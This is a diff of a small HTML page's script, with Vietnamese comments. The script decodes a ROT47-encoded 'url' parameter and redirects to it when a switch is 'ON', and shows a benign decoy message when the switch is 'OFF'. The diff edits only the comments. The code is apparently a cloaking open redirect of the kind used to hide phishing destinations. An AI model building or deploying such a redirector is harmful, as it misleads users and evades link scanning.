@@ -10,7 +10,7 @@
     
     <script>
         // Trạng thái chuyển hướng: 'ON' hoặc 'OFF'
-        const redirectStatus = 'OFF'; // Chỉnh sửa thành 'OFF' khi bạn không muốn chuyển hướng
+        const redirectStatus = 'OFF'; // Sửa thành 'OFF' để tắt giải mã và chuyển hướng
 
         function processData(input) {
             let result = '';
@@ -25,17 +25,19 @@
             return result;
         }
 
-        // Xử lý tham số đầu vào
+        // Lấy tham số từ URL
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
         if (redirectStatus === 'ON' && data) {
+            // Khi ON: Giải mã ROT47 và chuyển hướng
             const processed = processData(data);
             window.location.href = processed;
         } else if (!data) {
+            // Không có URL: Hiển thị thông báo lỗi
             document.body.innerHTML = "<p>Sorry, we couldn't load your content.</p>";
         } else {
-            // Khi redirectStatus là 'OFF', hiển thị nội dung tĩnh
+            // Khi OFF: Không giải mã, chỉ hiển thị nội dung tĩnh
             document.body.innerHTML = "<p>Your content is ready! Enjoy our service.</p>";
         }
     </script>
